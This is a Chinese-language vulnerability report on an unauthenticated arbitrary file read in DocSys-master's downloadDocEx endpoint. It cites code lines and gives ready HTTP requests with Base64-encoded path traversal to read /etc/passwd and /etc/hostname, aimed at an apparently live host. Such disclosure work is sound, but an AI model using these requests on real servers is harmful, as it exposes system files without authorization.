# DocSys-任意文件读取漏洞

## 漏洞描述

DocSys-master 是一款文档管理系统。其认证src/com/DocSystem/controller/DocController.java的downloadDocEx接口存在任意文件读取漏洞：

---

## 影响版本

DocSys-master（最新版本）

[DocSys_V2.02.85](https://gitee.com/RainyGao/DocSys/releases/tag/DocSys_V2.02.85)

---

## 利用条件

- 远程访问
- 无需登录

---

## 漏洞复现

### 任意文件读取

**文件路径**：`src/com/DocSystem/controller/DocController.java`
**行号**：3048-3050

用户请求参数 targetPath 和 targetName 直接来自 HTTP 请求，无认证检查

![image-20260803185644271](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803185644271.png)

3067-3085 — Base64 解码，无任何路径校验，3092 行直接传给文件读取方法

![image-20260803185823627](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803185823627.png)

src/com/DocSystem/controller/BaseController.java

第2338行直接调用文件输入输出流实现读取文件

![image-20260803190623579](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803190623579.png)

---

漏洞复现：

**请求包**：读取ect/passwd

```
GET /DocSystem/Doc/downloadDocEx.do?targetPath=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA&targetName= HTTP/1.1
Host: dw.gofreeteam.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Content-Length: 2
```

![image-20260803181622078](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803181622078.png)

读取/etc/hostname

```
/DocSystem/Doc/downloadDocEx.do?targetPath=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL2hvc3RuYW1l&targetName=
```

![image-20260803181729829](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803181729829.png)


